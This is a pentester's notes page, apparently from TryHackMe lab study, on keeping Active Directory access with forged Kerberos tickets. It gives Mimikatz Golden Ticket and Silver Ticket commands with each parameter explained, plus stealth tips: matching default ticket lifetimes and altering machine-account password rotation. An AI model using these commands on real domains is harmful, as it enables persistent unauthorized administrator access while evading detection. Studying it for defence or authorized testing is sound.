# Active Directory  Persistence With Tickets


Understanding Kerberos is a must, view: [[Active-Directory-Kerberos-Authenication-Defined]] and then [[Attacking-Kerberos]]. 


When using [[Golden-Tickets]]:
- Extend the valid for X amount time field
- 20 minutes for the Ticket
- Accounts must be 20 minutes old! 
	- Also disabled, deleted, or non-existent account can be impersonated 
- Consider making them on non-domain joined for stealth

When using [[Silver-Tickets]]:
- We can leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account
- Permissions are detirmined through SID so Non-existent users must have relevant SIDs, i.e SID that indictated the users to be in host's local administrators group 

Use AD-RSAT for Domain SID, then Golden Ticket with [[Mimikatz-Cheatsheet]]
```powershell
Get-ADDomain
# Mimikatz
# Golden Ticket
kerberos::golden /admin:$admin /domain:/$domain /id:500 /sid:$domain-SID /krbtgt:$krbtgt-hash /endin:600 /renewmax:10080 /ptt
```

-   **/admin** - The username we want to impersonate. This does not have to be a valid user.  
-   **/domain** - The FQDN of the domain we want to generate the ticket for.  
-   **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
-   **/sid** -The SID of the domain we want to generate the ticket for.
-   **/krbtgt** -The NTLM hash of the KRBTGT account.  
-   **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  
-   **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)  
-   **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session now

```powershell
Get-ADDomain # for Domain SID
# Mimikatz
# Silver Tickets
kerberos::golden /admin:$admin /domain:$domain /id:500 /sid:$Domain-SID /target:$target-hostname-server /rc4:$ntlm-hash-of-machine-account /service:cifs /ptt

```

-   **/admin** - The username we want to impersonate. This does not have to be a valid user.  
-   **/domain** - The FQDN of the domain we want to generate the ticket for.  
-   **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
-   **/sid** -The SID of the domain we want to generate the ticket for.
-   **/target* - the hostname of target server  
-   **/rc4** - The NTLM has of the machine account of our target
-   **/service** - The service we are requesting in our TGS. CIFs is a safe bet, since it allows file access  
-   **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session now

## References

[THM AD Persistence Room](https://tryhackme.com/room/persistingad)